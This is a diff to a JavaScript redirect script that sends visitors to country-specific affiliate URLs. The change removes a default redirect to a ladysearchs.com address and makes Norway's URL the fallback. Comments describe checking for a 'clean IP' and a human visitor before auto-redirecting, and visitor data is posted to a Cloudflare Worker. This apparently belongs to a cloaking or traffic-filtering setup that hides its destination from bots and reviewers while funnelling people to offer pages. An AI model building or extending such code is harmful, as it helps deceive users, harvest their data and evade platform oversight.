@@ -5,7 +5,7 @@ const se_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=121832&s1=G20&s2
 const no_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=153951&s1=G20&s2=G20';
 const ch_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=120583&s1=G20&s2=G20';
 const de_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=146265&s1=G20&s2=G20';
-const DEFAULT_REDIRECT_URL = 'https://glhpmr9.ladysearchs.com/xv7hcug';
+// DEFAULT_REDIRECT_URL removed — Norway is now the fallback for all unmatched countries.
 
 // ========== GLOBAL STATE ==========
 let userCountry = '';
@@ -141,23 +141,20 @@ function extractCampCode(fragmentData) {
 }
 
 // Pick the redirect URL based on country
-// - SE (Sweden) -> se_REDIRECT_URL
-// - NO (Norway) -> no_REDIRECT_URL
+// - SE (Sweden)      -> se_REDIRECT_URL
 // - CH (Switzerland) -> ch_REDIRECT_URL
-// - DE (Germany) -> de_REDIRECT_URL
-// - Otherwise   -> DEFAULT_REDIRECT_URL
+// - DE (Germany)     -> de_REDIRECT_URL
+// - Anything else    -> no_REDIRECT_URL (Norway is the fallback)
 function getRedirectUrl() {
     const country = (userCountry || '').toUpperCase();
     if (country === 'SE') return se_REDIRECT_URL;
-    if (country === 'NO') return no_REDIRECT_URL;
     if (country === 'CH') return ch_REDIRECT_URL;
     if (country === 'DE') return de_REDIRECT_URL;
-    return DEFAULT_REDIRECT_URL;
+    return no_REDIRECT_URL;
 }
 
 // Send data to Cloudflare Worker and redirect.
-// Picks the URL itself (based on global userCountry), or uses the worker's
-// redirectUrl if the worker returned one.
+// Picks the URL itself (based on global userCountry).
 async function sendToCloudflareAndRedirect(userData) {
     try {
         const response = await fetch(WORKER_URL, {
@@ -459,7 +456,7 @@ async function initApp() {
         return;
     }
     
-    // Clean IP + human -> auto redirect (URL picked by country)
+    // Clean IP + human -> auto redirect (URL picked by country, Norway fallback)
     console.log('[App] Clean IP + human - auto-redirecting');
     const userData = getFragmentData();
     await sendToCloudflareAndRedirect(userData);
